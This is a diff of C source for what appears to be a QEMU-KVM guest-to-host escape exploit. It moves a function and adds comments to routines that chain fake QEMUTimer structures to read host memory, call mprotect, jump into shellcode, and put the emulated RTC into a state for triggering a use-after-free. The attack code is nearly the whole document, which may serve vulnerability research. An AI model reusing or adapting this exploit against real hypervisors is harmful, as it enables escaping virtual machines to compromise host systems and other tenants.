@@ -287,17 +287,10 @@ void shellcode(struct shared_state *share) {
 asm("end_shellcode:");
 extern char end_shellcode[];
 
-struct QEMUTimer *construct_read(struct QEMUTimer *timer, hva_t hva, uint32_t **out) {
-    uint32_t *ptr = host_alloc(sizeof *ptr);
-    *out = ptr;
-
-    timer = fake_timer(BDRV_RW_EM_CB, gva_to_hva(ptr), timer);
-    timer = fake_timer(KVM_ARCH_DO_IOPERM, hva - 8, timer);
-    timer = fake_timer(QEMU_GET_RAM_PTR, 1<<20, timer);
-
-    return timer;
-}
-
+/*
+ * Construct a timer chain that performs an mprotect() and then calls
+ * into shellcode.
+ */
 struct QEMUTimer *construct_payload(void) {
     struct IORange *ioport;
     struct IORangeOps *ops;
@@ -322,6 +315,28 @@ struct QEMUTimer *construct_payload(void) {
     return timer;
 }
 
+/*
+ * Construct a timer chain that reads a single 4-byte value from the
+ * host, and writes a pointer to the result into *out.
+ */
+struct QEMUTimer *construct_read(struct QEMUTimer *timer, hva_t hva, uint32_t **out) {
+    uint32_t *ptr = host_alloc(sizeof *ptr);
+    *out = ptr;
+
+    timer = fake_timer(BDRV_RW_EM_CB, gva_to_hva(ptr), timer);
+    timer = fake_timer(KVM_ARCH_DO_IOPERM, hva - 8, timer);
+    timer = fake_timer(QEMU_GET_RAM_PTR, 1<<20, timer);
+
+    return timer;
+}
+
+
+/*
+ * Read and return 8 bytes from the host.
+ *
+ * The timer 'head' is currently queued on the host's timer queues,
+ * and after return, 'chain' will be queued.
+ */
 uint64_t read_host8(struct QEMUTimer *head, struct QEMUTimer *chain, hva_t addr) {
     uint64_t val = 0;
     uint32_t *low, *hi;
@@ -343,6 +358,19 @@ uint64_t read_host8(struct QEMUTimer *head, struct QEMUTimer *chain, hva_t addr)
     return val;
 }
 
+/*
+ * Massage the RTC into a convenient state for the exploit. Wait for a
+ * "UIE" interrupt, indicating the end of an update cycle, and then
+ * set register 10 to disable normal updating of the RTC. This has the
+ * effect of cutting rtc_update_second2 out of the loop, and just
+ * making rtc_update_second get called once a second.
+ *
+ * This is relevant because free() clobbers ->second_timer2, so if we
+ * don't make this change, we risk a SEGV if second_timer2 gets
+ * re-scheduled before we can exploit the bug.
+ *
+ * See qemu-kvm:hw/mc146818rtc.c for the relevant code.
+ */
 void wait_rtc(void) {
     int fd;
     int val;
